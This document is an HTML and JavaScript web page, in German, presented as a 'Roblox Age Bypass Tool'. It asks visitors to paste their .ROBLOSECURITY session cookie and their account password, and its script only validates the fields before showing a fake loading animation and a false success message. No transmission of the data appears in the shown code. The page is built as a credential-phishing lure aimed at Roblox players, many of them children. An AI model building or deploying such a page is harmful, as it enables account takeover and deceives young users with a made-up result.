<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Roblox Age Bypass Tool</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #0c0f1f;
    color: white;
    padding: 20px;
  }
  label, select, textarea, button {
    display: block;
    margin-bottom: 15px;
    width: 100%;
  }
  select, textarea {
    padding: 10px;
    border-radius: 5px;
    border: none;
    background: #1d2944;
    color: white;
    font-size: 16px;
  }
  textarea {
    resize: vertical;
    min-height: 80px;
  }
  button {
    background: linear-gradient(90deg, #ff00c8, #00f0ff);
    border: none;
    color: white;
    font-weight: bold;
    font-size: 18px;
    cursor: pointer;
    padding: 15px;
    border-radius: 8px;
  }
  #birthdate-selectors {
    display: flex;
    gap: 10px;
    margin-bottom: 20px;
  }
  #birthdate-selectors select {
    flex: 1;
  }
  #error-message, #success-message {
    display: none;
    padding: 15px;
    margin-top: 10px;
    border-radius: 5px;
    font-weight: bold;
  }
  #error-message {
    background: #ff3b3b;
  }
  #success-message {
    background: #4CAF50;
  }
  #loader-overlay {
    display: none;
    position: fixed;
    top:0; left:0; right:0; bottom:0;
    background: rgba(0,0,0,0.8);
    justify-content: center;
    align-items: center;
    z-index: 10000;
  }
  .loader {
    border: 8px solid #f3f3f3;
    border-top: 8px solid #00f0ff;
    border-radius: 50%;
    width: 60px;
    height: 60px;
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    0% { transform: rotate(0deg);}
    100% { transform: rotate(360deg);}
  }
</style>
</head>
<body>

<h1>Roblox Age Bypass Tool</h1>

<label for="bypass">Account Security Options:</label>
<select id="bypass">
  <option value="">Bitte auswählen</option>
  <option value="birthyear">2008 Birthyear Up</option>
  <option value="13plus">13+ All Ages</option>
</select>

<div id="cookie-block" style="display:none;">
  <label for="cookie-input">.ROBLOSECURITY Cookie:</label>
  <textarea id="cookie-input" placeholder="Füge hier deine .ROBLOSECURITY Cookie ein"></textarea>
</div>

<div id="password-block" style="display:none;">
  <label for="password-input">Account Passwort:</label>
  <textarea id="password-input" placeholder="Passwort eingeben"></textarea>
</div>

<label id="birthdate-label" style="display:none;">Geburtsdatum auswählen:</label>
<div id="birthdate-selectors" style="display:none;">
  <select id="birth-day">
    <option value="">Tag</option>
  </select>
  <select id="birth-month">
    <option value="">Monat</option>
  </select>
  <select id="birth-year">
    <option value="">Jahr</option>
  </select>
</div>

<button id="process-button">PROCESS ACCOUNT</button>

<div id="error-message"></div>
<div id="success-message"></div>

<div id="loader-overlay" style="display:flex;">
  <div class="loader"></div>
</div>

<script>
  const bypassSelect = document.getElementById('bypass');
  const cookieBlock = document.getElementById('cookie-block');
  const passwordBlock = document.getElementById('password-block');
  const birthdateLabel = document.getElementById('birthdate-label');
  const birthdateSelectors = document.getElementById('birthdate-selectors');
  const birthDay = document.getElementById('birth-day');
  const birthMonth = document.getElementById('birth-month');
  const birthYear = document.getElementById('birth-year');
  const processButton = document.getElementById('process-button');
  const errorMessage = document.getElementById('error-message');
  const successMessage = document.getElementById('success-message');
  const loaderOverlay = document.getElementById('loader-overlay');
  const cookieInput = document.getElementById('cookie-input');
  const passwordInput = document.getElementById('password-input');

  // Loader initial hidden
  loaderOverlay.style.display = 'none';

  // Fülle Tage 1-31
  for (let d=1; d<=31; d++) {
    const opt = document.createElement('option');
    opt.value = d;
    opt.textContent = d;
    birthDay.appendChild(opt);
  }

  // Fülle Monate 1-12
  const monthNames = ['Jan', 'Feb', 'Mär', 'Apr', 'Mai', 'Jun', 'Jul', 'Aug', 'Sep', 'Okt', 'Nov', 'Dez'];
  for (let m=1; m<=12; m++) {
    const opt = document.createElement('option');
    opt.value = m;
    opt.textContent = monthNames[m-1];
    birthMonth.appendChild(opt);
  }

  // Fülle Jahre (z.B. von 1970 bis 2010)
  const currentYear = new Date().getFullYear();
  for (let y = currentYear; y >= 1970; y--) {
    const opt = document.createElement('option');
    opt.value = y;
    opt.textContent = y;
    birthYear.appendChild(opt);
  }

  // Wenn Dropdown geändert wird
  bypassSelect.addEventListener('change', () => {
    const val = bypassSelect.value;
    // Reset Fehlermeldungen
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';

    // Verstecke alles zuerst
    cookieBlock.style.display = 'none';
    passwordBlock.style.display = 'none';
    birthdateLabel.style.display = 'none';
    birthdateSelectors.style.display = 'none';

    if(val === 'birthyear') {
      // Zeige Cookie + Geburtsdatum
      cookieBlock.style.display = 'block';
      birthdateLabel.style.display = 'block';
      birthdateSelectors.style.display = 'flex';
    } else if(val === '13plus') {
      // Zeige Cookie + Passwort + Geburtsdatum
      cookieBlock.style.display = 'block';
      passwordBlock.style.display = 'block';
      birthdateLabel.style.display = 'block';
      birthdateSelectors.style.display = 'flex';
    }
  });

  // Funktion zum Anzeigen von Fehler
  function showError(text) {
    errorMessage.textContent = text;
    errorMessage.style.display = 'block';
    successMessage.style.display = 'none';
  }

  // Funktion zum Anzeigen von Erfolg
  function showSuccess(text) {
    successMessage.textContent = text;
    successMessage.style.display = 'block';
    errorMessage.style.display = 'none';
  }

  // Simulierter Prozessablauf
  processButton.addEventListener('click', () => {
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';

    const val = bypassSelect.value;
    if (!val) {
      showError('Bitte wähle eine Option aus.');
      return;
    }

    // Cookie validieren
    const cookieVal = cookieInput.value.trim();
    if (!cookieVal) {
      showError('Bitte gib deine .ROBLOSECURITY Cookie ein.');
      return;
    }

    // Passwort nur bei 13plus
    if (val === '13plus') {
      if (!passwordInput.value.trim()) {
        showError('Bitte gib dein Passwort ein.');
        return;
      }
    }

    // Geburtsdatum validieren
    if (!birthDay.value || !birthMonth.value || !birthYear.value) {
      showError('Bitte wähle dein Geburtsdatum vollständig aus.');
      return;
    }

    // Alle Validierungen bestanden -> zeige Loader
    loaderOverlay.style.display = 'flex';

    // Simuliere async Task (z.B. Serveranfrage)
    setTimeout(() => {
      loaderOverlay.style.display = 'none';
      showSuccess('Alles hat funktioniert! Bitte warte 2-12 Stunden bis das Alter angepasst wird.');
    }, 2500);
  });
</script>

</body>
</html>
